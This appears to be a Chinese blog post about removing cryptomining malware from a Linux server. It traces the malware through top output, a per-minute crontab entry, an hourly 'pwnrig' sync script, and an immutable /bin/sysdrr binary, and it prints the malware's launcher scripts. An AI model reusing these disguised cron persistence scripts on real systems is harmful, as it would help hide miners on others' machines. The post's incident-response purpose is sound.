# 记一次服务器被当成矿机挖矿，CPU一直99%不下

## 问题排查与解决过程

### top 查询CPU占用过高的程序
```shell
Tasks: 254 total,   1 running, 253 sleeping,   0 stopped,   0 zombie
%Cpu(s):  99.2 us,  0.5 sy,  0.0 ni, 91.0 id,  0.3 wa,  0.0 hi,  0.0 si,  0.0 st
KiB Mem : 16266124 total,   196652 free, 15210732 used,   858740 buff/cache
KiB Swap:        0 total,        0 free,        0 used.   439680 avail Mem 

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                                              
17194 root  20   0 7391168   1.3g  34748 S  59.5  558.2   8083:37 -bash                                                                         
26099 root      20   0 3558676  80924   4120 S   1.7  0.5 113:04.64 cmagent                                                                              
30400 clouder+  20   0 8143696   1.6g  13308 S   1.0 10.3  67:36.12 java   
```

发现`-bash`占用550%的CPU，导致CPU总占用为99%

`kill -9 pid`后发现，过一会，`-bash`又启动了

### 查询定时任务

```shell
crontab -e 
****** /mnt/.systemd/-bash > /dev/null 2>&1
```

发现在用户的定时任务crontab中 `/mnt/.systemd/-bash` 没分钟定时跑一次，`-bash`内容如下：

```shell
#!/bin/bash
cd -- /mnt/.systemd
mkdir -- .-bash
cp -f -- x86_64 .-bash/-bash
./.-bash/-bash -c
rm -rf -- .-bash
```

发现真实的挖矿程序为`x86_64`，最终删除`-bash`脚本和`x86_64`程序

但是。过几分钟后，有发现挖矿程序有启动了 ，想着是不是有小时的定时脚本在跑，正好发现重启的时间正好是整点后的

### 查询定时任务执行日志

查询定时任务执行日志，分析是否还有其他定时任务在跑

```shell
vim /var/log/cron

# 分钟的，正好对应 crontab -e 中的定时脚本
May 30 23:59:01 hadoop2 CROND[29320]: (root) CMD (/mnt/.systemd/-bash > /dev/null 2>&1;)
May 31 00:00:01 hadoop2 CROND[29427]: (root) CMD (/mnt/.systemd/-bash > /dev/null 2>&1;)
May 31 00:01:01 hadoop2 CROND[29529]: (root) CMD (/mnt/.systemd/-bash > /dev/null 2>&1;)

# 小时整点的
May 31 00:01:02 hadoop2 run-parts(/etc/cron.hourly)[29530]: starting sync
May 31 00:01:02 hadoop2 run-parts(/etc/cron.hourly)[29601]: finished sync

```

通过查询定时任务执行日志发现，还存在小时的定时任务`sync`在执行，去到`/etc/cron.hourly`小时任务目录下查看，发现一个脚本为`sync`，脚本内容为：

```shell
#!/bin/bash
#
# Start/Stop the pwnrig clock daemon
#
# chkconfig 2345 90 60
# description: sync clock (GNU System)
cp -f -r -- /bin/sysdrr /usr/bin/-bash 2>/dev/null
cd /usr/bin/ 2>/dev/null
./-bash -c >/dev/null
rm -rf -- -bash 2>/dev/null
```

分析脚本内容为：复制`/bin/sysdrr`文件到`/usr/bin/`下，改名为`-bash`，启动服务，并删除`-bash`。从这可以看出`/bin/sysdrr`基本就是此次被入侵的源头

在` /bin/` 下找到 `sysdrr` 挖矿源病毒程序，并删除！同时也可以使用` find / -name sysdrr`全盘查找源病毒程序，并删除！

在` /etc/cron.monthly/` ,  `/etc/cron.weekly/` , ` /etc/cron.daily/` ,  `/etc/cron.hourly/` 这些定时目录里找到`sync`程序并删除！

但是在删除`/bin/sysdrr`文件和`sync`脚本时发现，使用`rm -f`命令删除：

```shell
rm -f sysdrr 
rm: 无法删除"sysdrr": 不允许的操作

# 使用 lsattr 查看
lsattr /bin/sysdrr 
----i--------e-- /bin/sys

# 解除限制
chattr -R -i /bin/sysdrr
lsattr /bin/sysdrr 
-------------e-- /bin/sysdrr

# 删除成功
rm -f sysdrr

```

同步骤删除`/etc/cron.monthly/ `，`/etc/cron.weekly/ `，`/etc/cron.daily/`，`/etc/cron.hourly/`下的`sync`脚本

至此，问题挖矿定时任务和程序文件全部清除，服务器的CPU使用情况恢复正常

## 总结
服务器的账号的登录密码不能可以设置的太简单，mysql、redis等服务的端口号尽量不使用默认端口号，相关的账号和密码不能设置过于简单



